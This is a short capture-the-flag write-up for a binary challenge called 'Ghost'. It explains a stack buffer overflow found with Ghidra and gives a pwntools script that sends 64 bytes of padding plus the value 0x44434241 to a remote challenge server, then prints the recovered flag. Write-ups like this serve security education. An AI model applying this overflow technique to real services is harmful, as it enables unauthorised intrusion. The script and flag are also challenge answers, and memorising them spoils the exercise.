# Ghost

> Find the flag.

Download the attachment [here](file/ghost)

## How to Solve

First we will do static analysis with `Ghidra`, and look to main function

![POC 1](images/POC%201.jpg)

At variable `local_164` is have 64 bytes size so we need filled them and make sure the variable `local_128` is equal to `0x44434241`

This the solver I use

```
from pwn import *

exe = './ghost'
host, port = '139.144.184.150', 4000
elf = context.binary = ELF(exe, checksec=True)
rop = ROP(exe)
context.log_level = 'info'

# io = process(exe)
io = remote(host, port)

offset = b'A'*64

payload = flat([
    offset,
    0x44434241
])

io.sendline(payload)
io.interactive()
```

![POC 2](images/POC%202.jpg)

And we got flag

```
BDSEC{You_have_been_haunted_by_a_ghost!}
```